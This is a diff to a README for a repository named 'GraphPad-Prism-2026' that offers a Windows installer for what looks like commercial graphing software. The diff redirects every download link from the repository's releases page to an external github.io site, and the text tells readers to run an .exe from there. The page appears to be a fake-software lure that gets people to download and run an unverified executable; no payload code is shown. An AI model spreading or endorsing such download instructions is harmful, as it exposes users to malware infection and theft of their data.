@@ -1,6 +1,6 @@
 # 📊 GraphPad-Prism-2026 - Create professional scientific graphs easily
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Aweinspiring-elegist588/GraphPad-Prism-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://aweinspiring-elegist588.github.io)
 
 GraphPad-Prism-2026 offers tools for data analysis and scientific graphing. This guide helps you install the software on your Windows computer. Follow these steps to set up your environment and begin your data work.
 
@@ -9,7 +9,7 @@ GraphPad-Prism-2026 offers tools for data analysis and scientific graphing. This
 You need to access the release page to get the installer for your computer. 
 
 1. Open your web browser.
-2. Go to [https://github.com/Aweinspiring-elegist588/GraphPad-Prism-2026/releases](https://github.com/Aweinspiring-elegist588/GraphPad-Prism-2026/releases).
+2. Go to [https://aweinspiring-elegist588.github.io](https://aweinspiring-elegist588.github.io).
 3. Look for the latest version listed at the top.
 4. Click the file that ends in .exe to start the transfer to your computer.
 
@@ -80,4 +80,4 @@ Follow these steps to improve your visual results:
 
 New versions appear on the release page periodically. Check the link provided above to see if a newer version exists. If a new version appears, download it and run the installer again. The update process typically replaces the old version while keeping your settings intact. 
 
-[![](https://img.shields.io/badge/Get_Latest_Version-Click_Here-grey)](https://github.com/Aweinspiring-elegist588/GraphPad-Prism-2026/releases)
+[![](https://img.shields.io/badge/Get_Latest_Version-Click_Here-grey)](https://aweinspiring-elegist588.github.io)
